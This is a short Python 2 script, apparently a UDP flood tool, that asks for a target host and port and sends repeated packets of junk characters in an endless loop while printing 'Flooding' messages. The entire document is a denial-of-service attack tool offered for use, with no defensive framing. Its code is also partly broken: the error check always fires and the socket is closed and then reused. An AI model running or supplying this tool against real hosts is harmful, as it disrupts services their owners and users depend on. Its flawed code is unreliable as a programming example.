#!/usr/bin/python
import socket, sys

data = "qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"
target = raw_input("Target: ")
port = input("Port: ")
adr = (target,port)
s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
while True:
    s.connect(adr)
    bytes = (data*64)
    bytesenc = str.encode(bytes)
    s.sendall(bytesenc)
    print 'Flooding {0} with {2} bytes of data'.format(target, port, sys.getsizeof(bytesenc))
    if socket.error:
        s.close()
